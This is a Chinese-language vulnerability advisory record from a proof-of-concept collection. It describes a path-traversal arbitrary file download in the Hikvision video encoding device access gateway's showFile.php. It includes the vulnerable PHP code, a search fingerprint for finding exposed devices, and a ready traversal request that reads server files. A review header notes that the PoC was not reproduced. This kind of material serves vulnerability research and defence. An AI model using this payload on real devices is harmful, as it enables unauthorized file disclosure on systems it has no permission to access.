---
version: "Hikvision 视频编码设备接入网关"
source: "Threekiii/Awesome-POC"
id: "vw-198bd0501232573f36c92b5f"
entity_id: "ve-198bd0501232573f36c92b5f"
schema_version: "1"
title: "Hikvision 视频编码设备接入网关 showFile.php 任意文件下载漏洞"
product: "Hikvision视频编码设备接入网关"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
identifier_status: "unknown"
identifier_role: "unknown"
primary_identifiers: ""
referenced_identifiers: ""
prerequisites: "../../../log前缀、PHP文件读权限；认证版本未知"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/IOT%E5%AE%89%E5%85%A8/%E6%B5%B7%E5%BA%B7%E5%A8%81%E8%A7%86/HIKVISION%20%E8%A7%86%E9%A2%91%E7%BC%96%E7%A0%81%E8%AE%BE%E5%A4%87%E6%8E%A5%E5%85%A5%E7%BD%91%E5%85%B3%20showFile.php%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E.md"
review_date: "2026-10-02"
side_effects: "本篇未提供足以确认无副作用的完整验证流程；应依正文所述配置、权限与交互前提评估，不能把通告或截图当成可直接运行的检测脚本"
source_status: "unknown"
canonical: "IOT安全/海康威视/HIKVISION 视频编码设备接入网关 showFile.php 任意文件下载漏洞.md"
---

# Hikvision 视频编码设备接入网关 showFile.php 任意文件下载漏洞

<!-- article-review:devices:begin -->
## 技术校订与证据边界（2026-10-02）

- 产品/组件：Hikvision视频编码设备接入网关
- 本文讨论：serverLog/showFile.php fileName路径穿越
- 版本、权限与配置前提：../../../log前缀、PHP文件读权限；认证版本未知
- 资料类型：源码/文件读取PoC；本次仅核对归档正文，未执行 PoC、未请求目标，未把原作者的“复现成功”继承为本库验证结果

### 逐项校订

- 响应htmlentities/nl2br转义应说明，非字节保真任意二进制下载
- 代码未含鉴权但外层未知；和downdb是不同根目录/输出函数
- 版本/修复未给

### 操作风险与恢复

- 本篇未提供足以确认无副作用的完整验证流程；应依正文所述配置、权限与交互前提评估，不能把通告或截图当成可直接运行的检测脚本

### 待核与来源

- 访问控制、可读范围和固件待核
- 引用图片未查看，截图内容及有效性待核验
- 文内原始链接和图片引用继续保留；未检查图片像素、未下载或执行外部附件。版本边界、修复/在野状态及厂商归属若缺一手依据，均不能视为本次已确认
- 下方保留原技术正文与载荷；其中历史时间表述和成功主张应按本节限定阅读
<!-- article-review:devices:end -->


## 漏洞描述

海康威视视频接入网关系统在页面`/serverLog/showFile.php`的参数fileName存在任意文件下载漏洞

## 漏洞影响

```
Hikvision 视频编码设备接入网关
```

## 网络测绘

```
title="视频编码设备接入网关"
```

## 漏洞复现

登录页面

![image-20220519174129368](./.resource/HIKVISION视频编码设备接入网关showFile.php任意文件下载漏洞/media/202205191743965.png)

漏洞文件为 `showFile.php`, 其中 `参数 fileName` 没有过滤危险字符，导致可文件遍历下载

```
<?php
					$file_name = $_GET['fileName'];
					$file_path = '../../../log/'.$file_name;
					$fp = fopen($file_path, "r");
					while($line = fgets($fp)){
						$line = nl2br(htmlentities($line, ENT_COMPAT, "utf-8"));
						echo '<span style="font-size:16px">'.$line.'</span>';
					}
					fclose($fp);
?>
```

POC

```
/serverLog/showFile.php?fileName=../web/html/main.php
```

![image-20220519174337483](./.resource/HIKVISION视频编码设备接入网关showFile.php任意文件下载漏洞/media/202205191743535.png)


---

> 来源：Threekiii/Awesome-POC
